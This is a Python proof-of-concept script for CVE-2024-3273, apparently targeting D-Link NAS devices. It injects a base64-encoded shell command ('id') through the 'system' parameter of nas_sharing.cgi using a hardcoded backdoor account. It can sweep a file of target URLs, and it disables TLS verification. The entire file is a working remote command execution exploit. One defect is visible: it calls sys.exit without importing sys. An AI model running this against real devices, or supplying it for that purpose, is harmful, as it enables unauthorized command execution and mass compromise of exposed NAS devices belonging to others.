import argparse
import requests
from urllib.parse import urlparse

print('----------------------------------------')
print('                                        ')
print('           CVE-2024-3273                ')
print('              by chunsheng-F0re4t       ')
print('----------------------------------------')

def poc(target):
    if not urlparse(target).scheme:
        target = "http://" + target
    url = target + "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ="
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Cache-Control": "no-cache, no-store, max-age=0",
        "Accept-Encoding": "identity"
    }
    # Add any necessary cookies or authentication headers

    try:
        response = requests.get(url, headers=headers, verify=False)  # Set verify to True if using SSL/TLS

        if response.status_code == 200:
            if "id=" in response.text:
                print(f"{target} [+] Vulnerability found!")
            else:
                print("[-] Vulnerability not found.")
        else:
            print("[-] Request failed with status code:", response.status_code)
    
    except requests.RequestException as e:
        print("[-] An error occurred:", str(e))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D-link-rce POC")
    parser.add_argument("-u", "--url", dest="target_url", help="Target URL")
    parser.add_argument("-f", "--file", dest="file_path", help="File containing target URLs")

    args = parser.parse_args()

    if not args.target_url and not args.file_path:
        parser.print_help()
        sys.exit(1)

    if args.target_url:
        poc(args.target_url)
    
    if args.file_path:
        with open(args.file_path, "r") as file:
            for line in file:
                target_url = line.strip()
                poc(target_url)


                